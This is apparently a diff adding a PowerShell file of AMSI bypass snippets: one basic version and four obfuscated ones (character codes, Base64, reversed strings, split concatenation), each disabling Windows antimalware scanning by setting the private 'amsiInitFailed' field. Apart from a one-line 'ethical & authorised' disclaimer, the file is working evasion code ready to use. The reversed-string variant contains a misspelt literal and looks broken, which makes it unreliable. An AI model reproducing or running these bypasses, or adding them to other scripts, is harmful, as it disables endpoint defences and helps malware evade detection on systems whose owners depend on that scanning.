@@ -1,0 +1,38 @@
+#Use in ethical & authorised environments
+
+#Basic
+$a = 'System.Management.Automation.A';$b = 'msiUtils'
+$c = [Ref].Assembly.GetType($a+$b)
+$d = $c.GetField('amsiInitFailed','NonPublic,Static')
+$d.SetValue($null,$true)
+
+#Obfuscated Versions 
+
+#Character Code Obfuscation
+$a=[char]83+[char]121+[char]115+[char]116+[char]101+[char]109+[char]46+[char]77+[char]97+[char]110+[char]97+[char]103+[char]101+[char]109+[char]101+[char]110+[char]116+[char]46+[char]65+[char]117+[char]116+[char]111+[char]109+[char]97+[char]116+[char]105+[char]111+[char]110+[char]46+[char]65+[char]109+[char]115+[char]105+[char]85+[char]116+[char]105+[char]108+[char]115
+$b=[char]97+[char]109+[char]115+[char]105+[char]73+[char]110+[char]105+[char]116+[char]70+[char]97+[char]105+[char]108+[char]101+[char]100
+$c=[Ref].Assembly.GetType($a)
+$d=$c.GetField($b,'NonPublic,Static')
+$d.SetValue($null,$true)
+
+#Base64 String Obfuscation
+$a=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHM='))
+$b=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('YW1zaUluaXRGYWlsZWQ='))
+$c=[Ref].Assembly.GetType($a)
+$d=$c.GetField($b,'NonPublic,Static')
+$d.SetValue($null,$true)
+
+#String Reverse
+$a=-join('slitUismA.noitamotuA.tnemeganM.metsyS'[-1..-43])
+$b=-join('deliaFtinIisma'[-1..-15])
+$c=[Ref].Assembly.GetType($a)
+$d=$c.GetField($b,'NonPublic,Static')
+$d.SetValue($null,$true)
+
+#Concatenate + Delays
+$p1='Sys'+'tem.'+'Man'+'age'+'ment.'
+$p2='Aut'+'oma'+'tion.'+'Ams'+'i'+'Uti'+'ls'
+$f1='am'+'si'+'In'+'it'+'Fa'+'il'+'ed'
+$c=[Ref].Assembly.GetType($p1+$p2)
+$d=$c.GetField($f1,'NonPublic,Static')
+$d.SetValue($null,$true)
